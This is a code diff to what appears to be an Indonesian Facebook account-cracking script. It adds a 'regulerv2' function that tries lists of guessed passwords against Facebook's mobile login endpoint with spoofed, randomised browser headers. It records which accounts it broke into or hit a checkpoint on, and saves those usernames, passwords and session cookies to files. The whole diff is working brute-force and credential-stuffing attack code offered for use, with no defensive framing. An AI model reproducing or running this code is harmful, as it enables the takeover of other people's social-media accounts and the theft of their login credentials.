@@ -1297,11 +1297,11 @@ def passwrd():
                 if 'reguler' in method:
                     pool.submit(reguler,idf,pwv)
                 elif 'mbasic' in method:
-                    pool.submit(crack3,idf,pwv)
+                    pool.submit(regulerv2,idf,pwv,'m.facebook.com')
                 elif 'validate' in method:
                     pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(crack3,idf,pwv)
+                    pool.submit(regulerv2,idf,pwv,'m.facebook.com')
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1314,7 +1314,79 @@ def passwrd():
         time.sleep(1)
         exit()
 
-
+def regulerv2(idf,pwv,url):
+	global loop,ok,cp
+	rr = random.randint
+	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
+	prog.update(des,description=f'\r[bold white]Reguler V2[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
+	prog.advance(des)
+	ua = random.choice(raka)
+	ses = requests.Session()
+	for pw in pwv:
+		pw = pw.lower()
+		try:
+			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(memek.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(memek.text)).group(1),
+'try_number': '0',
+'unrecognized_tries': '0',
+'email': idf,
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': 'false',
+'had_password_prefilled': 'false',
+'is_smart_lock': 'true',
+'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(memek.text)).group(1),
+'pass': pw,
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(memek.text)).group(1),
+'lsd': re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
+"__dyn": "",
+"__csr": "",
+"__a": "",
+"__user": "0",
+"_fb_noscript": "true"}
+			head = {"Host": url,
+"content-length": str(rr(2000,2199)),
+"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
+"sec-ch-ua-mobile": "?1",
+"user-agent": ua,
+"viewport-width": "360",
+"content-type": "application/x-www-form-urlencoded",
+"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
+"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
+"x-asbd-id": "129477",
+"x-requested-with": "com.android.chrome",
+"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+"sec-ch-prefers-color-scheme": "light",
+"sec-ch-ua-platform": '"Android"',
+"accept": "*/*",
+"origin": "https://"+url,
+"sec-fetch-site": "same-origin",
+"sec-fetch-mode": "cors",
+"sec-fetch-dest": "empty",
+"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+"accept-encoding": "gzip, deflate, br",
+"sec-websocket-version": str(rr(5,13)),
+"accept-language": AinkRaka}
+			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}')
+				open('RAKA_CP/'+raka_cp,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
+				open('RAKA_OK/'+raka_ok,'a').write(idf+'|'+pw+'\n')
+				break
+			else:continue
+		except requests.exceptions.ConnectionError:time.sleep(31)
+	loop+=1
 def crack3(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
